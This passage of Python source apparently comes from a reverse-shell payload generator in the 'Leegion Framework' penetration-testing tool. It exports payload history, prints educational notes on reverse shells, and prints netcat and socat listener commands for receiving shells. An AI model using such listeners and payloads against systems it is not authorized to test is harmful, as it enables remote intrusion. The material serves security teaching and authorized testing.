                    f.write(f"Language: {lang.upper()}\n")
                    f.write(f"Type: {ptype}\n")
                    f.write(f"Target: {ip}:{port}\n")
                    f.write(f"Payload: {payload}\n")
                    f.write("-" * 40 + "\n\n")

            self.print_success(f"Favorites exported to {filename}")
        except Exception as e:
            self.print_error(f"Export failed: {e}")

    def _export_history(self):
        """Export payload history"""
        if not self.history:
            self.print_info("No history to export")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/payload_history_{timestamp}.txt"

        try:
            os.makedirs("reports", exist_ok=True)

            with open(filename, "w") as f:
                f.write("Leegion Framework - Payload Generation History\n")
                f.write("=" * 50 + "\n\n")

                for lang, ptype, payload, ip, port, timestamp in self.history:
                    f.write(f"Time: {timestamp}\n")
                    f.write(f"Language: {lang.upper()}\n")
                    f.write(f"Type: {ptype}\n")
                    f.write(f"Target: {ip}:{port}\n")
                    f.write(f"Payload: {payload}\n")
                    f.write("-" * 40 + "\n\n")

            self.print_success(f"History exported to {filename}")
        except Exception as e:
            self.print_error(f"Export failed: {e}")

    def _payload_education(self):
        """Show educational resources about reverse shells"""
        print("\n\033[96mReverse Shell Educational Resources\033[0m")
        print("=" * 45)

        print("\n\033[93m🎓 What is a Reverse Shell?\033[0m")
        print("A reverse shell is a type of shell in which the target machine")
        print("communicates back to the attacking machine. The attacking machine")
        print("has a listener port on which it receives the connection.")

        print("\n\033[93m🔧 How it Works:\033[0m")
        print("1. Attacker sets up a listener on their machine")
        print("2. Target executes a reverse shell payload")
        print("3. Target connects back to attacker's machine")
        print("4. Attacker gains shell access to target")

        print("\n\033[93m🎯 Common Use Cases:\033[0m")
        print("• Penetration testing")
        print("• CTF challenges")
        print("• Security research")
        print("• System administration")

        print("\n\033[93m⚠️  Legal Considerations:\033[0m")
        print("• Only use on systems you own or have permission to test")
        print("• Reverse shells can be detected by security tools")
        print("• Always follow responsible disclosure practices")

        print("\n\033[93m📚 Learning Resources:\033[0m")
        print("• TryHackMe.com - Reverse Shells room")
        print("• HackTheBox.eu - Reverse shell challenges")
        print("• OWASP - Web Application Security Testing")
        print("• PentesterLab - Web for Pentester")

        print("\n\033[93m🛡️  Detection & Prevention:\033[0m")
        print("• Network monitoring for unusual connections")
        print("• Endpoint detection and response (EDR)")
        print("• Firewall rules and intrusion detection")
        print("• Regular security audits and penetration testing")

    def _add_to_history(
        self, language: str, payload_type: str, payload: str, ip: str, port: int
    ):
        """Add payload to history"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.history.append((language, payload_type, payload, ip, port, timestamp))

        # Keep only last 50 entries
        if len(self.history) > 50:
            self.history = self.history[-50:]

    def _show_listener_command(self, port: int):
        """Show the appropriate listener command"""
        print(f"\n\033[93m🎯 Listener Command:\033[0m")
        print(f"\033[92mnetcat -lvnp {port}\033[0m")
        print(
            f"\033[93mOr use:\033[0m \033[92msocat -d -d TCP-LISTEN:{port},reuseaddr,fork STDOUT\033[0m"
        )
